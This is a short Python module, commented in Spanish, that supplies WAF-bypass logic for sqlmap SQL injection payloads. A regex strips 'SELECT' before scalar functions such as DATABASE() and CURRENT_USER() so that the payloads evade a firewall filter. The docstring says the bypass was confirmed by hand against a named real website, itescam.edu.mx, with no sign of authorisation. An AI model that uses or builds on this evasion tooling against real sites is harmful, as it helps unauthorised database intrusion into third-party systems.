"""Lógica pura (sin dependencias de sqlmap) para el bypass de la
keyword `SELECT` cuando antecede directo a una llamada de función
escalar sin `FROM` (`DATABASE()`, `CURRENT_USER()`, `SUBSTRING()`, ...).

Separado del tamper real de sqlmap (`inyector/data/tampers/
scalarfuncbypass.py`, que sí depende de `lib.core.enums.PRIORITY` --
solo disponible cuando el módulo corre DENTRO del proceso de sqlmap,
con `/opt/sqlmap` en `sys.path`) para que también lo pueda usar
`WAFBypassProber` (que corre en el proceso de inyector, probando con
requests HTTP crudos, sin sqlmap de por medio) sin necesitar ese
import frágil entre procesos.

Confirmado manualmente contra itescam.edu.mx: ni '(SELECT/**/database())'
ni ninguna otra variante con espacio/comentario entre SELECT y la
función pasaba el filtro del WAF, pero '(database())' sola sí.
"""

import re

SCALAR_FUNCS = (
    "DATABASE", "SCHEMA", "USER", "CURRENT_USER", "SESSION_USER",
    "SYSTEM_USER", "VERSION", "SUBSTRING", "SUBSTR", "MID", "ASCII",
    "ORD", "LENGTH", "CHAR_LENGTH", "CONCAT", "IFNULL", "COALESCE",
)

# SELECT + (espacio o comentario inline, en cualquier orden/cantidad) +
# nombre de función + paréntesis de apertura.
_SEP = r"(?:\s|/\*.*?\*/)+"
PATTERN = re.compile(
    r"SELECT" + _SEP + r"(?=(?:" + _SEP + r")?(?:"
    + "|".join(SCALAR_FUNCS) + r")\s*\()",
    re.IGNORECASE,
)


def strip_select_before_scalar_func(payload: str) -> str:
    """Quita 'SELECT ' cuando precede directo a una función escalar
    conocida, dejando la llamada a función sola.

    >>> strip_select_before_scalar_func('(SELECT DATABASE())')
    '(DATABASE())'
    >>> strip_select_before_scalar_func('(SELECT/**/CURRENT_USER())')
    '(CURRENT_USER())'
    """
    if not payload:
        return payload
    return PATTERN.sub("", payload)
